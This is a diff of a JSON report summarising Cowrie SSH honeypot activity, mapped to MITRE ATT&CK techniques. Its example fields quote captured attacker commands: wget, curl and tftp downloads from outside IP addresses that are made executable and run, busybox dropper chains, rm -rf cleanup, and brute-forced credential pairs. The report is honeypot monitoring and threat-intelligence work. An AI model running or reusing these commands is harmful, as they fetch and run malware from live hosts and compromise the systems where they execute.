@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 06:00:34",
+  "generated": "2026-08-29 07:02:44",
   "totals": {
-    "commands": 166,
-    "login_failed": 287,
-    "login_success": 25,
-    "sessions": 403
+    "commands": 253,
+    "login_failed": 435,
+    "login_success": 34,
+    "sessions": 592
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 287,
+      "count": 435,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,14 +21,14 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T05:58:19.593009Z",
-      "unique_ips": 29
+      "last": "2026-08-29T07:02:30.093713Z",
+      "unique_ips": 35
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 31,
+      "count": 105,
       "examples": [
         "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,30 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-29T02:21:36.689252Z",
-      "last": "2026-08-29T04:57:15.662099Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 25,
-      "examples": [
-        "root / 123@@@",
-        "ubuntu / ubuntu",
-        "root / zlxx.",
-        "root / root",
-        "admin / 12345"
-      ],
-      "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T06:00:06.598720Z",
-      "unique_ips": 20
+      "last": "2026-08-29T06:42:19.871645Z",
+      "unique_ips": 5
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 22,
+      "count": 97,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -69,8 +53,24 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-29T00:23:05.332392Z",
-      "last": "2026-08-29T04:57:15.662099Z",
-      "unique_ips": 4
+      "last": "2026-08-29T06:42:20.545488Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 34,
+      "examples": [
+        "root / 123@@@",
+        "ubuntu / ubuntu",
+        "root / zlxx.",
+        "root / root",
+        "admin / 12345"
+      ],
+      "first": "2026-08-29T00:22:29.262232Z",
+      "last": "2026-08-29T06:56:05.881587Z",
+      "unique_ips": 23
     },
     {
       "id": "T1082",
@@ -95,6 +95,31 @@
       "first": "2026-08-29T03:07:39.054930Z",
       "last": "2026-08-29T04:57:10.326527Z",
       "unique_ips": 2
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 2,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-29T06:42:19.551602Z",
+      "last": "2026-08-29T06:42:19.871645Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-29T06:42:19.871645Z",
+      "last": "2026-08-29T06:42:19.871645Z",
+      "unique_ips": 1
     },
     {
       "id": "T1562.004",
@@ -139,6 +164,14 @@
       7
     ],
     [
+      "RPMA",
+      6
+    ],
+    [
+      "AMOO",
+      6
+    ],
+    [
       "ping ;sh",
       5
     ],
@@ -180,14 +213,6 @@
     ],
     [
       ">/var/run/.codi && cd /var/run/",
-      2
-    ],
-    [
-      ">/var/tmp/.codi && cd /var/tmp/",
-      2
-    ],
-    [
-      ">/.codi && cd /",
       2
     ]
   ]
